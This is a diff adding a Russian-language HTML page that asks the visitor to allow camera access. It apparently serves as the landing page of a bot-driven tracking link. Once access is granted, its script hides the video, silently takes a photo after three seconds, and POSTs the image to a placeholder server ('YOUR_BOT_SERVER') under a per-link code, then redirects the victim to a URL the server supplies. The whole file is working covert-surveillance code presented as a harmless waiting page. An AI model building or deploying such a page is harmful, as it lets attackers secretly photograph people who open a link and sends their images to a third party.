@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Подождите...</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #111;
+      color: #fff;
+      font-family: sans-serif;
+      flex-direction: column;
+    }
+    video, canvas { display: none; }
+  </style>
+</head>
+<body>
+  <h2>Пожалуйста, разрешите доступ к камере</h2>
+  <video autoplay playsinline></video>
+  <canvas></canvas>
+
+  <script>
+    const video = document.querySelector('video');
+    const canvas = document.querySelector('canvas');
+
+    const code = window.location.pathname.replace('/', '');
+
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          takePhoto();
+        }, 3000); // Подождать 3 сек перед фото
+      } catch (err) {
+        alert("Нет доступа к камере");
+      }
+    }
+
+    function takePhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+
+      const image = canvas.toDataURL('image/jpeg');
+
+      fetch('https://YOUR_BOT_SERVER/api/upload/' + code, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image })
+      })
+      .then(() => {
+        // Перенаправление после отправки фото
+        fetch('https://YOUR_BOT_SERVER/api/redirect/' + code)
+          .then(res => res.json())
+          .then(data => {
+            if (data.redirect_url) {
+              window.location.href = data.redirect_url;
+            } else {
+              document.body.innerHTML = '<h2>Спасибо!</h2>';
+            }
+          });
+      });
+    }
+
+    startCamera();
+  </script>
+</body>
+</html>
